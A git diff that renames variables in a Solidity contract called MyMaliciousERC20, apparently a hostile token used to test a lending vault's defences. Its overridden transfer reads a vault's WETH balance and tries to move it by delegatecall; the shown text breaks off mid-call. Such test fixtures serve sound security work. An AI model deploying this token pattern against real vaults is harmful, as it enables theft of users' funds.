@@ -8,20 +8,20 @@ import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
 
 contract MyMaliciousERC20 is ERC20, Ownable {
     uint8 internal _decimals;
-    address internal vaultCompartmentVictim;
-    address internal vaultAddr;
+    address internal _vaultCompartmentVictim;
+    address internal _vaultAddr;
 
     constructor(
-        string memory name,
-        string memory symbol,
-        uint8 __decimals,
-        address _vaultCompartmentVictim,
-        address _lenderVault
-    ) ERC20(name, symbol) Ownable() {
-        _decimals = __decimals;
-        _mint(_lenderVault, 100 ether);
-        vaultCompartmentVictim = _vaultCompartmentVictim;
-        vaultAddr = _lenderVault;
+        string memory tokenName,
+        string memory tokenSymbol,
+        uint8 tokenDecimals,
+        address vaultCompartmentVictim,
+        address lenderVault
+    ) ERC20(tokenName, tokenSymbol) Ownable() {
+        _decimals = tokenDecimals;
+        _mint(lenderVault, 100 ether);
+        _vaultCompartmentVictim = vaultCompartmentVictim;
+        _vaultAddr = lenderVault;
     }
 
     function mint(address account, uint256 amount) external {
@@ -30,7 +30,7 @@ contract MyMaliciousERC20 is ERC20, Ownable {
 
     function transfer(address, uint256) public override returns (bool) {
         address collTokenAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; //weth
-        uint256 repayAmount = IERC20(collTokenAddr).balanceOf(vaultAddr); //get balance
+        uint256 repayAmount = IERC20(collTokenAddr).balanceOf(_vaultAddr); //get balance
         (bool success, bytes memory result) = collTokenAddr.delegatecall(
             abi.encodeWithSelector(
                 bytes4(keccak256("transfer(address,uint256)")),
